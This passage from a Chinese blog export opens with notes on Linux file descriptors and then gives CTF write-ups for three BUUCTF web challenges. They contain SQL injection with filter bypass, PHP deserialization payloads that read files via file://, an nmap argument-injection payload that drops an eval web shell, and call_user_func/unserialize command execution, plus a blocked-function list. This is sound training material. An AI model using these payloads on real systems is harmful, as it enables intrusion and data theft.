<p>inode table同样是<strong>全局唯一</strong>的，它指向了真正的文件地址(磁盘中的位置)，每个entry全局唯一。</p>
<h2 id="流程">3.2. 流程</h2>
<p>当程序向内核发起 system call open()，内核会：</p>
<ol type="1">
<li>允许程序请求</li>
<li>创建一个entry并插入到file table中，然后返回fd</li>
<li>程序把fd插入到fd table中</li>
</ol>
<p>当程序再次发起 sytem call read()是，需要把相关的fd传给内核，内核根据fd定位到具体的文件(fd -&gt; file table -&gt; inode table)并向磁盘发起读取请求，再把读取的数据返回给程序处理。</p>
<p>read 函数定义 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure></p>
<p>write 函数定义 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbytes)</span></span>;</span><br></pre></td></tr></table></figure></p>
<p>从上面的结果来看，fd就是file table的一个索引，指向了file table中的entry。</p>
<h1 id="查看进程的-file-descriptor">4. 查看进程的 file descriptor</h1>
<p>可以使用下面的命令查看进程的fd: <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -l /proc/[pid]/fd</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515212853.png" /></p>
<p>上图中的蓝色数字就是fd。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux基础</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯 2018 Fakebook</title>
    <url>/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，有 <code>login</code> 和 <code>join</code> 两个按钮，先用 admin 弱口令测试了一下，发现登陆失败，就尝试注册一个账号。这里需要注意的是 blog 那一栏应该有特殊的验证，我这里使用 <code>123.blog</code> 成功注册。</p>
<p>登录成功后发现username可以点击，点击之后 url 出现了一个 no 参数，因此测试一下是否存在 sql 注入。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162039.png" /></p>
<h1 id="第一次sql注入">第一次sql注入</h1>
<p>先用如下payload测试，发现注入点的闭合方式为空。接下来就是常规的注入过程。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1=1</span><br><span class="line">?no=1=2</span><br></pre></td></tr></table></figure></p>
<p>然后 fuzz 以下，发现没有字符被过滤（可能是我的字典太小了）</p>
<h2 id="获取字段数">获取字段数</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1 order by 4</span><br></pre></td></tr></table></figure>
<h2 id="测试显示位">测试显示位</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure>
<p>发现这个payload被过滤了。但是空格， 逗号，union，select都没有被过滤。经过多次测试，发现后台应该检测的是<code>union select</code>，那么payload设置为 <code>union/**/select</code> 即可绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162640.png" /></p>
<p>上面的信息很丰富：</p>
<ul>
<li><strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes in <strong>/var/www/html/view.php</strong> on line <strong>31</strong> 存在反序列化</li>
<li>显示位为 2</li>
<li>地址为：<strong>/var/www/html/view.php</strong></li>
</ul>
<h2 id="常规注入">常规注入</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?no=-1 union/**/select 1,database(),3,4</span><br><span class="line">2. ?no=-1 union/**/select 1,user(),3,4</span><br><span class="line">3. ?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br><span class="line">4. ?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">5. ?no=-1 union/**/select 1,no,3,4 from fakebook.users</span><br></pre></td></tr></table></figure>
<p>获得的结果依次是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fakebook</span><br><span class="line">root@localhost</span><br><span class="line">users</span><br><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">1</span><br><span class="line">hdf</span><br><span class="line">3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>接下来就不知道该如何是好了，如果是单纯的 sql 注入，应该会显示出 flag，这明显是信息收集的还不够。</p>
<h1 id="信息收集">信息收集</h1>
<p>想到 <code>robots.txt</code> 看一下 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure></p>
<p>发现存在着备份文件泄露，下载打开得到如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>（这里也说明，blog是有特殊的格式要求的。）</p>
<p>发现确实存在序列化的过程，注意到 <code>function get($url)</code> 和 <code>public function getBlogContents ()</code> 可以读取文件内容，并且上面已经得到文件路径了，那么猜测flag所在的文件路径为：<code>/var/www/html/flag.php</code>。</p>
<p>编写如下脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;hdf&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> UserInfo;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;/var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>那么接下来问题就是哪里传入我们构造的序列化后的字符串。</p>
<h1 id="第二次sql注入">第二次sql注入</h1>
<p>注意力回到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure></p>
<p>注意到4个字段顺序：<code>no,username,passwd,data</code> ，猜测分别对应 1，2，3，4。并且 data 字段返回的是一个序列化后的过程。因此，做一个假设：</p>
<p><strong>后台的工作模式：先用 no 进行第一次查询，然后得到对应的 <code>no,username,passwd,data</code> 信息。接着将 data 字段进行反序列后，获取对应地址的内容。</strong></p>
<p>因此，将上述序列化后的字符带入得到如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>查看源码发现： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165151.png" /></p>
<p>点击得到 flag。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165208.png" /></p>
<h1 id="其他注入方法">其他注入方法</h1>
<p>注意到，获取用户信息的时候得到的是：<code>root@localhost</code>，root权限非常大，因此可以尝试直接读取flag文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>
<p>查看源码，直接获得 flag <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165450.png" /></p>
<h1 id="总结">总结</h1>
<p>本题考的应该是两次注入的过程，第一次常规，第二次反序列化。不过平常刷题中也要注意用户的权限问题，这里的用户权限我确实没想到。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯 2020 朱雀组 Nmap</title>
    <url>/2022/04/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%20Nmap/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5B网鼎杯%202020%20朱雀组%5DNmap">网鼎杯 2020 朱雀组 Nmap</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境发现如下界面：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411162826.png" /></p>
<p>根据<code>nmap</code>猜测，这是后台调用了<code>nmap</code>脚本来执行我们在输入框输入的。经过测试发现许多符号在执行的时候都会在前面添加一个<code>\</code>，下图中的<code>;</code>前面就被添加了。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411162937.png" /></p>
<p>因此猜测后台使用了<code>escapeshellarg + escapeshellcmd</code>。</p>
<p>查看页面源码发现在最下面发现一个注释<code>flag is in /flag</code>。</p>
<h1 id="解题">解题</h1>
<p>关于<code>escapeshellarg + escapeshellcmd</code>的知识可以参考我之前写的<a href="https://hdfzzf.icu/2022/03/22/BUUCTF%202018%20Online%20Tool/?highlight=online">BUUCTF 2018 Online Tool</a></p>
<p>这里有两种解法：</p>
<ol type="1">
<li>方法_1</li>
</ol>
<p>直接使用<a href="https://hdfzzf.icu/2022/03/22/BUUCTF%202018%20Online%20Tool/?highlight=online">BUUCTF 2018 Online Tool</a>中的payload，提示<code>Hacker...</code>。猜测是过滤了<code>php</code>，因此修改为如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?= eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.phtml &#x27;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p><code>&lt;?php</code>可以用<code>&lt;?=</code>代替 <strong>短标签</strong></p>
</blockquote>
<p>虽然提示了<code>Host maybe down</code>，但是已经被执行了。直接访问</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411164005.png" /></p>
<p>然后用蚁剑连接，flag文件在根目录。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411164108.png" /></p>
<ol start="2" type="1">
<li>方法_2</li>
</ol>
<p>nmap命令可以利用<code>-iL</code>读取文件中的内容，然后进行扫描。我们再将扫描的结果用<code>-oN</code>写入另一个文件，然后直接访问该文件即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &#x27;-iL /flag -oN exp.txt &#x27;</span><br></pre></td></tr></table></figure>
<p>也是会提示<code>Host maybe down</code>，但是可以直接访问。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411164248.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>RCE</tag>
        <tag>nmap命令</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯 2020 朱雀组 phpweb</title>
    <url>/2022/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%20phpweb/</url>
    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，会发现5秒后自动跳转到 index.php 页面，并且之后每5秒刷新一次，查看源码，发现应该是如下函数： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setTimeout(&quot;document.form1.submit()&quot;,5000)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230357.png" /></p>
<p>这不是重点，接着我们抓包</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230244.png" /></p>
<p>发现 POST 提交了两个参数 <code>func</code> 和 <code>p</code> 。结合上面的表单消息推测，<code>func</code> 应该是函数的意思，而 <code>p</code> 应该是一个参数。（上面表单中的<code>p</code> 是时间的格式，可能是参数）</p>
<h1 id="解题">解题</h1>
<p>将函数随便改一个试试看（这里 echo 并不是函数，主要想看看报错的信息）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230721.png" /></p>
<p>注意 <code>call_user_func()</code>，这函数的作用简而言之就是调用一个PHP函数，可以带入参数，语法如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call_user_func(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$parameter</span> = ?, <span class="keyword">mixed</span> $... = ?): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure></p>
<p>更多信息请参考：<a href="https://www.php.net/manual/zh/function.call-user-func.php">PHP_call_user_func</a></p>
<p>因此，我们尝试用 <code>file_get_contents()</code> 读取一下 <code>index.php</code> 的内容</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327231040.png" /></p>
<p>将代码整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">	<span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">	    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">	<span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">    <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">	    <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这里<code>get time</code> 中的 <code>call_user_func()</code> 函数能够调用的函数被禁了好多，但是这不是重点，重点是 <code>Test</code> 类里面的 <code>__destruct</code> ，这个也可以调用 <code>call_user_func()</code> 而且是不经过验证。因此思路就是构造序列化字符串作为 POST 提交的 <code>p</code> ，而POST 提交的 <code>func</code> 则为 <code>unserialize</code>。</p>
<p>接下来构造 <code>p</code> （这里的p指的是POST提交的，而不是类中的）</p>
<blockquote>
<p>这里类中的 var 其实是 public 的别名</p>
</blockquote>
<p>编写简单的PHP脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;参数&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>参数依次如下： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. ls / # 查看根目录</span><br><span class="line">2. ls   # 查看当前目录</span><br><span class="line">3. find / -name flag* # 找flag文件路径，这里会找到很多，但是其他的一看就不像</span><br><span class="line">4. cat /tmp/flagoefiu4r93 # 读取flag</span><br></pre></td></tr></table></figure></p>
<p>将上面参数带入PHP脚本，然后执行得到的字符串作为 POST 提交的 p。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327232126.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327232212.png" /></p>
<h1 id="总结">总结</h1>
<p>本题难度并不大，主要的难点就在于报错提示的 <code>call_user_func()</code> ，要明白它的作用。本题考的其实是PHP知识点，熟悉PHP中的函数尤其是调用系统的命令的函数以及反序列化知识点。前者其实可以在 <strong>命令执行</strong> 相关题目中积累。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
</search>
